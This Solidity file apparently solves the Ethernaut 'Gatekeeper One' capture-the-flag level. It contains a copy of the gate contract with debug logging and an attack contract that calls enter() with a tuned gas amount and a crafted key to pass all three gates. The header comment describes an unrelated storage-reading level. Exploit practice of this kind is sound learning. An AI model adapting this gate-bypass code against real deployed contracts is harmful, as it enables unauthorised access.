// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title GarekeeperOne
/// @author OpenZeppelin
/// @notice Read storage and cast
///         Read storage with ethers or web3js for ex. and then cast the bytes32 data to bytes16
///         Once again, nothing on the blockchain is truly private
///         getStorageAt(), can easily get data from a contract
///         It can be complicated due to the fact that there can be data slot optimizations (32bytes)
///         

import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract GatekeeperOneTest {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }

  function testModifiers(bytes8 _gateKey) public view {
    console.log("uint32(uint64(_gateKey))", uint32(uint64(_gateKey)));
    console.log("gate 1 = uint16(uint64(_gateKey))", uint16(uint64(_gateKey)));
    console.log("gate 2 = uint64(_gateKey)", uint64(_gateKey));
    console.log("gate 3 = uint16(uint160(tx.origin)", uint16(uint160(tx.origin)));

    console.log("uint64", uint64(_gateKey));

    if(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))){
        console.log("meets req for gate one");
    }
    
    if(uint32(uint64(_gateKey)) != uint64(_gateKey)){
        console.log("meets req for gate two");
    }

    if(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))){
        console.log("meets req for gate three");
    }
  }
}

import {GatekeeperOne} from "./13_Gatekeeper.sol";

contract GatekeeperOneTestAttack{
  GatekeeperOneTest public gateTest;

  constructor(address _address){
    gateTest = GatekeeperOneTest(_address);
  }

  function attack(bytes8 _key) public view {
    gateTest.testModifiers(_key);
  }

  function realAttack(address gate, bytes8 _key) public returns(bool){
    (bool status, ) = address(gate).call{gas: 56348}(abi.encodeWithSignature("enter(bytes8)", _key));
    return status;
  }
}